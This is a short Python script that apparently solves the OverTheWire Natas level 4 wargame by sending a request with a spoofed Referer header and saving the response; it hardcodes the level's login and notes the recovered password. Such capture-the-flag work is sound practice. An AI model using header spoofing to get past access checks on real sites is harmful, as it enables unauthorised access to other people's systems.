import requests
import sys
username = "natas4"
password = "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"
header = {"referer": "http://natas5.natas.labs.overthewire.org/"}
response = requests.get("http://natas4.natas.labs.overthewire.org", auth=(username, password), headers=header)

sys.stdout = open("results.html", "w")
print(response.text)
sys.stdout.close()

#found pass is Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ